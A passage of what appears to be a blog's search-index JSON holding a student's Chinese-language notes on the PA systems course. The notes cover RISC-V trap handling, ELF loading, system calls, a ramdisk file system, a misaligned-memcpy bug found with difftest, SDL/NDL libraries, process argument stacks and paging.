cpu.mepc = epc;\n    cpu.mcause = NO;\n    cpu.mstatus.part.MPP = cpu.priv;\n    cpu.priv = 3;\n    cpu.mstatus.part.MPIE = cpu.mstatus.part.MIE;\n    cpu.mstatus.part.MIE = 0;\n    return cpu.mtvec;\n}\n</code></pre> \u5728 mret \u65f6\u505a\u7684\u64cd\u4f5c\uff1a <pre><code>s-&gt;dnpc = cpu.mepc;\ncpu.mstatus.part.MIE = cpu.mstatus.part.MPIE;\ncpu.mstatus.part.MPIE = 1;\ncpu.priv = cpu.mstatus.part.MPP;\ncpu.mstatus.part.MPP = 0;\n</code></pre></p>"},{"location":"cs/system/pa/#pa32","title":"PA3.2","text":"<p>\u8fd9\u90e8\u5206\u4e5f\u7b97\u662f\u5b9e\u73b0\u8d77\u6765\u6bd4\u8f83\u590d\u6742\u7684\u4e86\uff0c\u56e0\u4e3a\u8981\u5b9e\u73b0 ELF \u6587\u4ef6\u7684\u52a0\u8f7d\u3002</p>"},{"location":"cs/system/pa/#elf","title":"ELF \u52a0\u8f7d","text":"<p>\u53ef\u4ee5\u901a\u8fc7 elf.h \u5bfc\u5165\u4e00\u4e9b\u7ed3\u6784\u4f53\u6765\u8fdb\u884c\u89e3\u6790\u3002\u9996\u5148\u6700\u5f00\u5934\u7684\u662f ELF \u5934\uff08Ehdr\uff09\uff0c\u5148\u8bfb\u53d6\u7136\u540e\u5224\u65ad\u9b54\u6570\u4ee5\u53ca\u673a\u5668\u7c7b\u578b\uff1a <pre><code>Elf32_Ehdr ehdr;\nfread(&amp;ehdr, sizeof(ehdr), 1, fp);\nassert(*(uint32_t*)ehdr.e_ident == *(uint32_t*)ELFMAG);\nassert(ehdr.e_machine == EM_RISCV);\n</code></pre> \u63a5\u7740\u6839\u636e ehdr.e_phoff \u627e\u5230\u7a0b\u5e8f\u8868\u5934\uff0c\u7136\u540e\u8bfb\u53d6 ehdr.e_phnum \u4e2a Phdr\uff1a <pre><code>Elf32_Phdr *phdr = (Elf32_Phdr*)malloc(sizeof(Elf32_Phdr) * ehdr.e_phnum);\nfseek(fp, ehdr.e_phoff, SEEK_SET);\nfread(phdr, sizeof(Elf32_Phdr), ehdr.e_phnum, fp);\n</code></pre> \u7136\u540e\u904d\u5386\u7a0b\u5e8f\u8868\uff0c\u5224\u65ad p_type\uff0c\u5982\u679c\u662f PT_LOAD \u5219\u8bf4\u660e\u662f\u9700\u8981\u52a0\u8f7d\u7684\u90e8\u5206\uff0c\u7136\u540e\u590d\u5236 p_filesz \u4e2a\u5b57\u8282\u5230 p_vaddr \u4f4d\u7f6e\uff0c\u540e\u518d\u9644\u52a0 p_memsz - p_filesz \u4e2a\u5b57\u8282\u7684 0\uff08bss \u6bb5\uff09\u5373\u53ef\u3002\u6700\u540e loader \u9700\u8981\u8fd4\u56de\u7a0b\u5e8f\u5165\u53e3\u5730\u5740\uff0c\u5373 ehdr.e_entry\u3002</p>"},{"location":"cs/system/pa/#_4","title":"\u7cfb\u7edf\u8c03\u7528","text":"<p>\u7cfb\u7edf\u8c03\u7528\u7684\u5b9e\u73b0\u4e5f\u5f88\u7b80\u5355\uff0c\u524d\u9762\u5728 CTE \u4e2d\u5c06 a7 \u4e3a -1 \u7684 ecall \u8bc6\u522b\u4e3a\u4e86 yield\uff08\u5e95\u5c42\u7684 yield \u800c\u975e\u7cfb\u7edf\u8c03\u7528\u7684 yield\uff09\uff0c\u5269\u4f59\u7684\u90fd\u53ef\u4ee5\u8bc6\u522b\u4e3a\u7cfb\u7edf\u8c03\u7528\uff0c\u6307\u5b9a\u4e3a EVENT_SYSCALL\uff0c\u7136\u540e\u5904\u7406\u5c31\u5728 NanOS-lite \u4e2d\u4e86\uff0cirq.c \u4e2d do_event \u63a5\u6536 event\uff0c\u8bc6\u522b\u4e3a EVENT_SYSCALL \u540e\u8c03\u7528 do_syscall\uff0c\u7136\u540e\u518d\u6839\u636e a7 \u7684\u503c\u8fdb\u884c\u76f8\u5e94\u7684\u7cfb\u7edf\u8c03\u7528\u5373\u53ef\u3002\u8fd9\u91cc\u8981\u8bb0\u5f97\u5c06 mepc \u52a0 4 \u5426\u5219\u4f1a\u6b7b\u5faa\u73af\u3002\u5176\u5b9e\u53ef\u4ee5\u9488\u5bf9 EVENT_YIELD \u548c EVENT_SYSCALL \u90fd\u8fdb\u884c mepc += 4\uff0c\u800c\u540e\u9762\u7684\u786c\u4ef6\u4e2d\u65ad\u4f8b\u5982\u65f6\u949f\u4e2d\u65ad\u5219\u4e0d\u9700\u8981\u3002</p> <p>\u5728\u8f6f\u4ef6\u5c42\u9762\u7684\u7cfb\u7edf\u8c03\u7528\u662f\u5728 navy-apps \u7684 libos \u4e2d\u7684\uff0c\u6bcf\u4e2a\u7cfb\u7edf\u8c03\u7528\u51fd\u6570\uff08_exit\u3001_open \u7b49\uff09\u90fd\u4f1a\u8c03\u7528 _syscall_ \u51fd\u6570\uff0c\u5176\u4e2d\u662f\u5185\u8054\u6c47\u7f16\u5e03\u5c40\u5bc4\u5b58\u5668\u540e\u6267\u884c ecall \u6307\u4ee4\uff0c\u7136\u540e\u8fd4\u56de a0 \u7684\u503c\u3002\u7cfb\u7edf\u8c03\u7528\u51fd\u6570\u53ea\u9700\u8981 return _syscall_(SYS_..., ...) \u5373\u53ef\u3002\u6240\u4ee5\u6574\u4e2a\u7cfb\u7edf\u8c03\u7528\u8fc7\u7a0b\u662f\u4ece Navy-apps \u7533\u8bf7\u5f00\u59cb\uff0cNEMU \u6267\u884c ecall \u6307\u4ee4\u8f6c\u5230 AM \u63d0\u4f9b\u7684\u5f02\u5e38\u5904\u7406\u7a0b\u5e8f\uff0c\u7136\u540e\u5206\u53d1\u7ed9 NanOS-lite \u5904\u7406\uff0c\u518d\u4e00\u5c42\u5c42\u8fd4\u56de\u3002\u53ef\u89c1\u8fd9\u662f\u4e00\u4e2a\u975e\u5e38\u5178\u578b\u7684\u8f6f\u786c\u4ef6\u534f\u540c\u7684\u4f8b\u5b50\u3002</p> <p>\u800c\u8fd9\u4e00\u90e8\u5206\u9700\u8981\u5b9e\u73b0 yield exit write brk \u7cfb\u7edf\u8c03\u7528\uff0c\u524d\u4e24\u4e2a\u6ca1\u4ec0\u4e48\u95ee\u9898\uff0cbrk \u8fd9\u91cc\u4e5f\u6bd4\u8f83\u597d\u5199\uff0c\u56e0\u4e3a\u8fdb\u884c\u7684\u5e76\u4e0d\u662f\u771f\u6b63\u7684\u5806\u7ba1\u7406\uff0c\u800c\u662f\u6a21\u62df\u8fbe\u5230\u4e86\u7c7b\u4f3c\u80fd\u8dd1\u7684\u6548\u679c\u3002</p> <p>\u800c write \u5728\u5199\u7684\u65f6\u5019\u5c31\u51fa\u4e86\u4e00\u70b9\u95ee\u9898\uff0c\u8fd0\u884c\u8d77\u6765\u4e00\u76f4\u90fd\u662f printf \u53ea\u4f1a\u8f93\u51fa\u4e00\u4e2a\u5b57\u7b26\uff0c\u5f88\u5947\u602a\uff0c\u6211\u5f53\u65f6\u53c8\u6000\u7591\u662f printf \u51fa\u4e86\u95ee\u9898\u3002\u6700\u540e\u9010\u4e00\u6392\u67e5\u53d1\u73b0\u662f write \u7cfb\u7edf\u8c03\u7528\u7684\u8fd4\u56de\u503c\u6ca1\u6709\u4f20\u51fa\u53bb\uff0c\u5bfc\u81f4\u8f93\u51fa\u4e00\u4e2a\u5b57\u7b26\u5c31\u7ed3\u675f\u4e86\u3002</p>"},{"location":"cs/system/pa/#pa33","title":"PA3.3","text":"<p>\u8fd9\u4e00\u90e8\u5206\u8981\u5b8c\u5584\u4e00\u4e2a\u7b80\u6613\u7684\u6587\u4ef6\u7cfb\u7edf\uff08\u5185\u5bb9\u56fa\u5b9a\u3001\u5927\u5c0f\u56fa\u5b9a\u3001\u6ca1\u6709\u76ee\u5f55\u2026\u2026\uff09\uff0c\u7136\u540e\u5c06\u8bbe\u5907\u62bd\u8c61\u4e3a\u865a\u62df\u6587\u4ef6\uff0c\u518d\u5b8c\u5584 Navy-apps \u7684\u4e00\u7cfb\u5217\u5e93\u6765\u8fd0\u884c\u8d77\u5404\u79cd\u5404\u6837\u7684\u7a0b\u5e8f\u3002</p>"},{"location":"cs/system/pa/#_5","title":"\u6587\u4ef6\u7cfb\u7edf","text":"<p>\u8fd9\u91cc\u7684\u6587\u4ef6\u7cfb\u7edf\u6574\u4f53\u5b58\u50a8\u5728 ramdisk.img \u4e2d\uff0c\u901a\u8fc7 resource.S \u4e2d\u7684 .incbin \u52a0\u8f7d\u8fdb\u6765\u3002\u7136\u540e\u6bcf\u4e00\u4e2a\u6587\u4ef6\u90fd\u53ef\u4ee5\u901a\u8fc7\u4e00\u4e2a\u7ed3\u6784\u4f53\u6765\u8bb0\u5f55\uff1a <pre><code>typedef size_t (*ReadFn) (void *buf, size_t offset, size_t len);\ntypedef size_t (*WriteFn) (const void *buf, size_t offset, size_t len);\ntypedef struct {\n    char *name;\n    size_t size;\n    size_t disk_offset;\n    ReadFn read;\n    WriteFn write;\n    size_t open_offset;\n} Finfo;\n</code></pre> \u7136\u540e\u901a\u8fc7\u4e00\u4e2a Finfo \u7684\u6570\u7ec4\u6765\u5728\u6587\u4ef6\u63cf\u8ff0\u7b26\u548c Finfo \u4e4b\u95f4\u8fdb\u884c\u6620\u5c04\u3002\u8fd9\u91cc\u8fd8\u6709\u4e00\u4e2a\u6211\u89c9\u5f97\u5f88\u5de7\u5999\u7684\u5730\u65b9\uff0c\u5c31\u662f\u5728\u7f16\u8bd1 Navy-apps \u7684\u8fc7\u7a0b\u4e2d\uff0c\u6240\u6709\u53ef\u6267\u884c\u6587\u4ef6\u548c\u7d20\u6750\u90fd\u4f1a\u5b58\u5728 fsimg \u6587\u4ef6\u5939\u4e0b\uff0c\u7136\u540e Makefile \u4e2d\u7684\u811a\u672c\u4f1a\u5c06\u5176\u6253\u5305\u6210\u4e00\u4e2a ramdisk.img\uff0c\u7136\u540e\u540c\u65f6\u63d0\u53d6\u51fa name\u3001size\u3001disk_offset \u7684\u4fe1\u606f\u683c\u5f0f\u5316\u5230\u4e00\u4e2a files.h \u4e2d\u3002\u5728\u5b9a\u4e49 Finfo \u6570\u7ec4\u7684\u65f6\u5019\u76f4\u63a5 include \u8fdb\u6765\uff0c\u5c31\u5728\u7f16\u8bd1\u65f6\u5b8c\u6210\u4e86\u6587\u4ef6\u7cfb\u7edf\u5168\u90e8\u5185\u5bb9\u7684\u521d\u59cb\u5316\u3002</p> <p>\u5bf9\u4e8e\u865a\u62df\u6587\u4ef6\uff0c\u76f4\u63a5\u5b9a\u4e49\u7684\u65f6\u5019\u52a0\u4e0a\u5bf9\u5e94\u7684\u540d\u5b57\uff0c\u7136\u540e\u6307\u5b9a\u7279\u6709\u7684 read \u548c write\uff0c\u5728\u6267\u884c fs_read fs_write \u7684\u65f6\u5019\u5982\u679c read write \u4e0d\u4e3a NULL \u5219\u8c03\u7528\uff0c\u5426\u5219\u8c03\u7528 ramdisk_read ramdisk_write\uff0c\u8fd9\u6837\u5c31\u5b9e\u73b0\u4e86\u8fd9\u4e2a\u6587\u4ef6\u7cfb\u7edf\u7684\u57fa\u672c\u529f\u80fd\u3002 <pre><code>enum { FD_STDIN, FD_STDOUT, FD_STDERR, FD_FB, FD_EVENTS };\nstatic Finfo file_table[] = {\n    [FD_STDIN]  = { \"stdin\", 0, 0, invalid_read, invalid_write },\n    [FD_STDOUT] = { \"stdout\", 0, 0, invalid_read, serial_write },\n    [FD_STDERR] = { \"stderr\", 0, 0, invalid_read, serial_write },\n    [FD_FB]     = { \"/dev/fb\", 0, 0, invalid_read, fb_write },\n    [FD_EVENTS] = { \"/dev/events\", 0, 0, events_read, invalid_write },\n    {\"/proc/dispinfo\", 0, 0, dispinfo_read, invalid_write },\n#include \"files.h\"\n};\n</code></pre> \u9664\u6b64\u4e4b\u5916 Finfo \u8fd8\u9700\u8981\u7ef4\u62a4 open_offset\uff0c\u8fd9\u91cc\u6211\u5f53\u65f6\u7406\u89e3\u9519\u4e86\uff0c\u5b9e\u9645\u4e0a\u5e94\u8be5\u662f\u8ddd\u79bb disk_offset \u7684\u504f\u79fb\uff0c\u800c\u6211\u7406\u89e3\u4e3a\u4e86\u5728 ramdisk \u4e2d\u6574\u4f53\u7684\u504f\u79fb\uff0c\u4e0d\u8fc7\u5b9e\u73b0\u540e\u7684\u6700\u7ec8\u6548\u679c\u8fd8\u662f\u4e00\u6837\u7684\u3002</p>"},{"location":"cs/system/pa/#load","title":"load \u5bf9\u9f50\u5f02\u5e38","text":"<p>\u8fd9\u4e2a\u95ee\u9898\u4e5f debug \u4e86\u597d\u4e45\uff0c\u8bf4\u8d77\u6765\u4e5f\u5f88\u795e\u5947\uff0c\u8fd9\u4e2a bug \u6765\u81ea PA2.2 \u4f46\u4e00\u76f4\u6ca1\u53d1\u73b0\uff0c\u76f4\u5230 PA4.1 \u624d\u901a\u8fc7 difftest \u53d1\u73b0\uff0c\u800c\u5b9e\u9645\u51fa\u95ee\u9898\u7684\u5730\u65b9\u53c8\u662f\u5728 PA3.3 \u8fd9\u91cc\u5199\u8fc7\u7684 ramdisk_read\u3002</p> <p>PA4.1 \u53d1\u73b0\u95ee\u9898\u7684\u65f6\u5019\u5f88\u5947\u602a\uff0cdifftest \u7684 ref \u83ab\u540d\u5176\u5999\u5730\u8df3\u5230\u4e86 mtvec \u5f02\u5e38\u5904\u7406\u51fd\u6570\u4f4d\u7f6e\uff0c\u800c dut \u7ee7\u7eed\u5f80\u4e0b\u8fd0\u884c\uff0c\u5bfc\u81f4 pc \u51fa\u73b0\u4e86\u4e0d\u540c\u3002\u8fd4\u56de\u53bb\u770b\u51fa\u9519\u7684 pc \u4f4d\u7f6e\u7684\u6307\u4ee4\uff0c\u7adf\u7136\u662f\u4e00\u6761 load \u6307\u4ee4\u3002\u5f53\u65f6\u6211\u8fd8\u4ee5\u4e3a\u662f\u4ec0\u4e48\u5947\u602a\u7684\u65f6\u949f\u4e2d\u65ad\u5565\u7684\uff0c\u6bd5\u7adf\u5173\u6389\u4e86 difftest \u662f\u5b8c\u5168\u53ef\u4ee5\u8dd1\u8d77\u6765\u7684\u3002</p> <p>\u56e0\u4e3a difftest \u53d1\u73b0\u5f02\u5e38\u540e\u5c31\u9000\u51fa\u4e86\uff0c\u4e0d\u80fd\u8ba9 ref \u7ee7\u7eed\u8fd0\u884c\uff0c\u6240\u4ee5\u5f53\u65f6\u6211\u5c31\u56f0\u5728\u8fd9\u91cc\u4e86\uff0c\u4ee5\u4e3a\u4e0d\u597d\u518d\u8c03\u8bd5\u4e86\u3002\u4f46\u7a81\u7136\u53cd\u5e94\u8fc7\u6765\u518d\u53d1\u751f\u5f02\u5e38\u7684\u65f6\u5019\uff0c\u8fd9\u65f6 trap \u539f\u56e0\u5c31\u5df2\u7ecf\u5b58\u5230 mcause \u91cc\u4e86\uff0c\u800c\u8fd9\u65f6\u6211\u662f\u53ef\u4ee5\u8f93\u51fa ref \u4e2d mcause \u7684\u503c\u7684\u3002\u4e00\u8f93\u51fa\u6765\u770b\uff0c\u7adf\u7136\u662f 4\uff0c\u4e5f\u5c31\u662f Load Address Misaligned\u3002\u9664\u6b64\u4e4b\u5916\u6309\u7167 RISC-V \u7684\u89c4\u5b9a\u8fd9\u65f6\u8bd5\u56fe\u8bbf\u95ee\u7684\u5730\u5740\u4f1a\u88ab\u5b58\u5230 mtval \u5bc4\u5b58\u5668\u4e2d\uff0c\u6240\u4ee5\u6211\u53c8\u52a0\u4e86\u8fd9\u4e2a\uff0c\u7136\u540e\u540c\u65f6\u8f93\u51fa\uff0c\u53d1\u73b0\u662f ramdisk \u4e2d\u7684\u5730\u5740\uff0c\u800c\u8fd9\u4e2a\u5730\u5740\u4e0d\u662f 4 \u7684\u500d\u6570\u3002</p> <p>\u6211\u56de\u5fc6\u8d77\u6765\u4e4b\u524d\u6587\u6863\u4e2d\u6709\u4e00\u4e2a\u5730\u65b9\u8bf4\u5230\u4e86 Spike \u4e0d\u5141\u8bb8\u4e0d\u5bf9\u9f50\u7684\u8bbf\u95ee\uff0c\u7136\u540e\u7ffb\u4e86\u4e00\u904d\u53d1\u73b0\u662f\u5728 PA2.2\uff0c\u540c\u65f6\u91cc\u9762\u4e5f\u8bf4\u4e86\u8fd9\u5927\u6982\u662f\u7531\u4e8e klib \u5b9e\u73b0\u9519\u8bef\u5f15\u8d77\u7684\u3002\u518d\u6df1\u5165\u8c03\u4e86\u4e00\u4e0b\u53d1\u73b0\u786e\u5b9e\uff0c\u95ee\u9898\u6765\u81ea\u4e8e memcpy\u3002\u6211\u5f53\u65f6\u76f4\u63a5\u9009\u7528\u4e86 copilot \u63d0\u4f9b\u7684\u5199\u6cd5\uff0c\u4e5f\u5c31\u662f\u5148\u5c1d\u8bd5\u4e00\u4e2a int \u4e00\u4e2a int \u62f7\u8d1d\uff0c\u6700\u540e\u4e0d\u5230\u4e00\u4e2a int \u4e86\u518d\u9010 byte \u62f7\u8d1d\u3002\u8fd9\u91cc\u5c31\u5ffd\u7565\u4e86\u4e00\u4e2a\u95ee\u9898\uff0c\u5c31\u662f\u5982\u679c\u6700\u5f00\u59cb\u7684\u5730\u5740\u4e0d\u662f 4 \u7684\u500d\u6570\uff0c\u90a3\u4e48\u8bfb\u53d6\u4e00\u4e2a int \u5c31\u662f\u4e0d\u5bf9\u9f50\u7684\u8bbf\u95ee\uff0c\u867d\u7136 NEMU \u4e2d\u6ca1\u95ee\u9898\uff0c\u4f46 Spike \u8ba4\u4e3a\u51fa\u4e86\u95ee\u9898\uff0c\u8fdb\u5165\u4e86\u5f02\u5e38\u5904\u7406\u3002</p> <p>\u6240\u4ee5\u89e3\u51b3\u65b9\u6848\u662f\u4fee\u6539 memcpy\uff0c\u5148\u62f7\u8d1d\u5b57\u8282\u5230\u5bf9\u9f50\u7684\u4f4d\u7f6e\uff0c\u7136\u540e\u518d\u4ee5 int \u4e3a\u5355\u4f4d\u62f7\u8d1d\u3002\u4e0d\u8fc7\u8fd8\u662f\u61d2\u5f97\u5199\u4e86\uff0c\u5c31\u5168\u90e8\u9010\u5b57\u8282\u62f7\u8d1d\u4e86\u3002</p>"},{"location":"cs/system/pa/#navy","title":"Navy \u5e93\u8865\u5145","text":"<p>\u8fd9\u91cc\u8981\u5b8c\u5584\u5b9a\u70b9\u7b97\u6570 fixedpt \u5e93\uff0cNDL \u5e93\uff0cminiSDL \u5e93\u3002\u524d\u4e24\u4e2a\u90fd\u6ca1\u4ec0\u4e48\u5927\u95ee\u9898\u3002</p> <p>\u5728\u5b9e\u73b0 NDL_DrawRect \u7684\u65f6\u5019\u6700\u5f00\u59cb\u8fd8\u662f\u7ed5\u4e86\u4e00\u4e0b\u7684\u3002\u5b83\u7684\u76ee\u6807\u662f\u5728\u663e\u793a\u5668\u4e2d\u753b\u4e00\u4e2a\u77e9\u5f62\uff0c\u4e5f\u5c31\u662f\u5c06\u77e9\u5f62\u7684\u6570\u636e\u586b\u5199\u5230 frame buffer \u4e2d\uff0c\u4e5f\u5c31\u662f\u5199\u5165 /dev/fb \u8fd9\u4e2a\u865a\u62df\u6587\u4ef6\u3002\u800c\u6211\u5f53\u65f6\u5c31\u88ab\u8fd9\u4e2a\u64cd\u4f5c\u56f0\u4f4f\u4e86\uff0c\u56e0\u4e3a\u5199\u7684\u65f6\u5019\u53c2\u6570\u5c31\u53ea\u6709 offset \u548c len\uff0c\u800c\u9700\u8981\u8868\u793a\u7684\u5462\uff0c\u662f\u4e00\u4e2a\u77e9\u5f62\u7684\u8303\u56f4\uff0c\u6240\u4ee5\u6211\u5c31\u60f3\u4e86\u4e00\u4e2a\u975e\u5e38\u6c99\u96d5\u7684\u529e\u6cd5\uff0c\u5c06\u5de6\u4e0a\u89d2 (x, y) \u5206\u9ad8 16 \u4f4d\u548c\u4f4e 16 \u4f4d\u5199\u5165 offset\uff0c\u7136\u540e\u957f\u548c\u5bbd\u540c\u6837\u5199\u5165 len \u4e2d\uff0c\u6700\u540e\u5728 fb_write \u4e2d\u7279\u6b8a\u5904\u7406\u7684\u5230 x y w h\u3002\u8fd9\u6837\u8dd1\u662f\u80fd\u8dd1\uff0c\u4f46\u662f\u4e00\u65e6\u5c06 Navy-apps \u653e\u5728 native \u4e0a\u8fd0\u884c\u5c31\u4e0d\u884c\u4e86\uff08\u56e0\u4e3a\u8fd9\u65f6\u4f1a\u4f7f\u7528 NDL \u5e93\uff0c\u4f46\u5e95\u5c42\u7684 fb \u5199\u5165\u5904\u7406\u4e0d\u662f NanOS-lite \u505a\u7684\uff0c\u800c\u662f native \u505a\u7684\uff09\u3002</p> <p>\u7136\u540e\u6211\u8bb2\u8fd9\u4e2a\u95ee\u9898\u4ea4\u7ed9\u4e86 copilot\uff0c\u5b83\u4e00\u4e0b\u5c31\u5199\u51fa\u6765\u4e86\uff0c\u89e3\u51b3\u529e\u6cd5\u662f\u901a\u8fc7 for \u5faa\u73af\u4e00\u884c\u4e00\u884c\u5199\u5165 fb\u2026\u2026 \u6211\u771f\u7684\u662f\u8111\u5b50\u9508\u4f4f\u4e86\uff08</p> <p>\u7136\u540e\u6bd4\u8f83\u75db\u82e6\u7684\u5c31\u662f miniSDL \u5e93\u4e86\uff0c\u8fd9\u65f6\u7684\u8fd0\u884c\u5c31\u662f\u8f6f\u4ef6\u8c03\u7528 SDL\uff0cSDL \u8c03\u7528 NDL\uff0cNDL \u5199\u5165 fb\uff0cfb_write \u5199\u5165 VGA \u8bbe\u5907\u8fd9\u6837\u7684\u5173\u7cfb\u3002\u8fd9\u4e2a SDL \u7684 surface\uff0cNDL \u7684 canvas\uff0cfb \u7684\u5927\u5c0f\u4e4b\u95f4\u7684\u5173\u7cfb\u662f\u4e00\u4e2a\u503c\u5f97\u597d\u597d\u8003\u8651\u7684\u95ee\u9898\u3002</p> <ul> <li>\u53ea\u770b NDL \u548c fb<ul> <li>canvas \u662f\u8bb0\u5f55\u5728 NDL \u4e2d\u7684\u5168\u5c40\u6570\u636e</li> <li>\u4ece fb \u4e2d\u83b7\u53d6\u5c4f\u5e55\u5927\u5c0f\u6570\u636e\u5b58\u5728 screen \u4e2d</li> <li>\u7ed8\u56fe\uff08DrawRect\uff09\u7684\u65f6\u5019\u6839\u636e canvas screen x y \u8ba1\u7b97\u51fa\u5728\u5c4f\u5e55\u4e0a\u5b9e\u9645\u7684\u4f4d\u7f6e\u5750\u6807\uff08canvas \u76f8\u5bf9 screen \u5c45\u4e2d\uff09\u7136\u540e\u5199\u5165 fb</li> </ul> </li> <li>\u770b SDL\uff0c\u8fd9\u65f6\u5019\u53ea\u9700\u8981\u8003\u8651\u5b83\u4e0b\u4e00\u5c42\u7684 NDL\uff0c\u800c\u65e0\u9700\u8003\u8651 fb \u7684\u95ee\u9898<ul> <li><code>SDL_UpdateRect(SDL_Surface *s, int x, int y, int w, int h);</code> \u5b9e\u9645\u4e0a\u662f\u63d0\u53d6 s \u4e0a\u4ece (x, y) \u5f00\u59cb\u7684 w*h \u5927\u5c0f\u7684\u77e9\u5f62\uff0c\u7136\u540e\u901a\u8fc7 NDL_DrawRect \u753b\u51fa\u6765\uff0c\u6b64\u65f6\u7684\u53c2\u6570\u4e5f\u662f\u4ece (x, y) \u5f00\u59cb\uff0c\u5bbd\u9ad8\u4e3a w h</li> <li><code>SDL_FillRect</code> \u6ca1\u4ec0\u4e48\u597d\u8bf4\u7684\uff0c\u76f4\u63a5\u586b\u5165 surface \u7684 pixels \u5c31\u597d</li> <li><code>SDL_BlitSurface(SDL_Surface *src, SDL_Rect *srcrect, SDL_Surface *dst, SDL_Rect *dstrect);</code> \u5b9e\u9645\u4e0a\u5728\u505a\u7684\u662f\u5c06 src \u4e0a\u7684\u4e00\u90e8\u5206\u77e9\u5f62\u5185\u5bb9\u62f7\u8d1d\u5230 dst \u4e0a\u6307\u5b9a\u7684\u4f4d\u7f6e\uff0c\u5177\u4f53\u4f4d\u7f6e\u548c\u5927\u5c0f\u53c2\u8003 SDL \u6587\u6863\u3002\u800c\u4e14\u8fd9\u91cc\u751a\u81f3\u4e0d\u9700\u8981\u8003\u8651 NDL\uff0c\u53ea\u8981\u590d\u5236\u8fc7\u53bb\u4e86\u5c31\u597d</li> </ul> </li> </ul> <p>\u90fd\u8c03\u597d\u4e4b\u540e\u5c31\u53ef\u4ee5\u6210\u529f\u8fd0\u884c NSlider\u3001MENU\u3001NTerm\u3001Flappy Bird\u3001\u4ed9\u5251\u5947\u4fa0\u4f20\u7b49\u63d0\u4f9b\u597d\u7684\u7a0b\u5e8f\u4e86\u3002\u6700\u540e\u7684 execve \u7cfb\u7edf\u8c03\u7528\u8fd9\u91cc\u4e5f\u53ea\u9700\u8981\u76f4\u63a5 load \u4e00\u4e2a\u65b0\u7a0b\u5e8f\u8fdb\u6765\u5c31\u53ef\u4ee5\u4e86\u3002</p>"},{"location":"cs/system/pa/#pa4","title":"PA4","text":""},{"location":"cs/system/pa/#pa41","title":"PA4.1","text":"<p>\u8fd9\u4e00\u90e8\u5206\u8981\u5b9e\u73b0\u7ebf\u7a0b\u4e0a\u4e0b\u6587\u7684\u521b\u5efa\uff0c\u5305\u62ec\u5185\u6838\u8fdb\u7a0b\u548c\u7528\u6237\u8fdb\u7a0b\uff0c\u6b64\u5916\u7528\u6237\u8fdb\u7a0b\u52a0\u8f7d\u65f6\u8fd8\u9700\u8981\u4e3a\u5176\u5e03\u5c40\u597d argc argv envp \u7684\u53c2\u6570\u6808\u3002</p> <p>\u5bf9\u4e8e\u5185\u6838\u8fdb\u7a0b\uff0c\u8981\u5b9e\u73b0\u7684\u6709\u4e3a mstatus \u8d4b\u521d\u503c\u3001\u8bbe\u7f6e mepc \u4e3a\u5165\u53e3\u70b9\u3001\u8bbe\u7f6e a0 \u4e3a\u53c2\u6570\uff0c\u8bbe\u7f6e sp \u4e3a\u6808\u7a7a\u95f4\u5f00\u5934\u7b49\u3002\u7528\u6237\u8fdb\u7a0b\u7c7b\u4f3c\u3002</p> <p>\u800c\u8fd9\u91cc\u7528\u6237\u8fdb\u7a0b\u7684\u52a0\u8f7d\u5219\u9700\u8981\u4e00\u4e2a\u65b0\u7684\u51fd\u6570 context_uload \u6765\u5b8c\u6210\uff0c\u5176\u4e2d\u8981\u8fdb\u884c\u53c2\u6570\u7684\u5e03\u5c40\u3002\u5177\u4f53\u6765\u8bb2\u5c31\u662f\u4ece\u6808\u9876\uff08\u9ad8\u5730\u5740\uff09\u5f00\u59cb\u4f9d\u6b21\u5b58\u653e envp \u5404\u4e2a\u5b57\u7b26\u4e32\uff0cargv \u5404\u4e2a\u5b57\u7b26\u4e32\uff0c\u7a7a\u4e00\u4e2a\uff08envp \u6570\u7ec4\u6700\u540e\u7684 NULL\uff09\uff0c\u7136\u540e\u5012\u5e8f\u5b58\u653e envp \u6570\u7ec4\uff08\u5185\u5bb9\u662f\u6307\u5411\u524d\u9762\u5404\u4e2a\u5b57\u7b26\u4e32\u7684\u6307\u9488\uff09\uff0c\u7a7a\u4e00\u4e2a\uff08argv \u6570\u7ec4\u6700\u540e\u7684 NULL\uff09\uff0c\u7136\u540e\u5012\u5e8f\u5b58\u653e argv \u6570\u7ec4\uff0c\u6700\u540e\u5b58\u653e argc\u3002\u7136\u540e\u7528\u6237\u6808\u4ece\u540e\u9762\u5f00\u59cb\u5411\u4f4e\u5730\u5740\u5ef6\u4f38\u3002\u5177\u4f53\u5c31\u5f88\u597d\u5b9e\u73b0\u4e86\u3002</p>"},{"location":"cs/system/pa/#pa42","title":"PA4.2","text":"<p>\u8fd9\u4e00\u90e8\u5206\u8981\u5b9e\u73b0\u5206\u9875\u673a\u5236\uff0c\u505a\u8fd9\u91cc\u7684\u65f6\u5019\u5b66\u6821\u7684\u7cfb\u7edf\u8bfe\u7a0b\u8fd8\u6ca1\u6709\u964d\u5230\u865a\u62df\u5185\u5b58\u7ba1\u7406\u7684\u90e8\u5206\uff0cRISC-V \u624b\u518c\u9605\u8bfb\u5f53\u65f6\u4e5f\u8df3\u8fc7\u4e86\u8fd9\u91cc\uff0c\u53ef\u80fd\u7406\u89e3\u7684\u8fd8\u662f\u4e0d\u591f\u900f\u5f7b\uff0c\u53ea\u662f\u80fd\u8dd1\u800c\u5df2\uff0c\u6240\u4ee5\u5c31\u4e0d\u518d\u8fd9\u91cc\u8be6\u7ec6\u5199\u4e86\u3002\u5177\u4f53\u4f1a\u5728\u7cfb\u7edf\u8bb2\u5230\u7684\u65f6\u5019\u5199\u5230\u90a3\u91cc\uff0c\u4ee5\u53ca RISC-V \u624b\u518c\u4e4b\u540e\u518d\u8be6\u7ec6\u8bfb\u4e86\u4e4b\u540e\u518d\u8865\u5145\u8fdb\u53bb\u3002</p> <p>\u8fd9\u91cc\u5f53\u65f6\u8c03\u8bd5\u7684\u4e00\u4e2a\u56f0\u96be\u662f\u5b9e\u73b0\u4e86\u5206\u9875\u673a\u5236\u4e4b\u540e difftest \u65f6 mstatus \u603b\u662f\u5bf9\u4e0d\u4e0a\uff0c\u7136\u540e\u4ed4\u7ec6\u4fee\u6539\u4e86 ecall\u3001mret \u7684\u5b9e\u73b0\uff0c\u7ed3\u679c\u5f02\u5e38\u53f7\u53c8\u5bf9\u4e0d\u4e0a\u4e86\uff088/11\uff0c\u5927\u6982\u662f\u7279\u6743\u7ea7\u8bb0\u5f55\u7684\u95ee\u9898\uff09\u3002\u800c\u4e14 ref \u4e5f\u4f1a\u629b\u51fa 7 \u53f7\u5f02\u5e38\uff0c\u4e5f\u5c31\u662f Store/AMO Access 